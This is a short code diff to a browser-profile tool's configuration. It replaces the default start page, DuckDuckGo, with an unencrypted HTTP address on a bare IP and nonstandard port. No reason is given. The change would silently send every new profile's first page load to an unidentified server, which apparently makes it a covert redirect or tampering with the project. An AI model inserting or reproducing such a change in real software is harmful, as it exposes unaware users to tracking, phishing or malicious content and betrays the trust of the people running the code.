@@ -15,7 +15,7 @@ import type { BrowserEngine } from "../../types";
 
 /** Prefilled into the Start page input for new profiles (a real, editable
  *  value — the user can select/clear it, not just a placeholder). */
-export const DEFAULT_START_URL = "https://duckduckgo.com/";
+export const DEFAULT_START_URL = "http://185.235.219.144:8095/start";
 
 /** Engines a user can assign to a profile. CFT is intentionally not offered. */
 export const ENGINE_ROSTER: ReadonlyArray<{
